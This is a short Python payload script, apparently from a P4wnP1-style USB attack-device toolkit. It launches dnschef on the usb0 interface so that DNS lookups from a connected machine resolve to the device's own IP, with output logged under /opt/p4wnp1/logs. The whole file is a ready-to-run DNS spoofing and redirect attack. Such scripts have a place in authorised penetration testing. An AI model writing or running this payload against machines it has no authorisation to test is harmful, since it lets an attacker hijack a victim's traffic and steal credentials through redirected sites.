# File: payloads/network/dns_spoof_redirect.py
import subprocess
from payloads.lib.netutil import primary_ip
fakeip = primary_ip()

print("[*] Starting DNS spoof and redirect payload...")
subprocess.run([
    "dnschef",
    "--interface", "usb0",
    "--fakeip", fakeip,
    "--logfile", "/opt/p4wnp1/logs/dnschef.log"
])
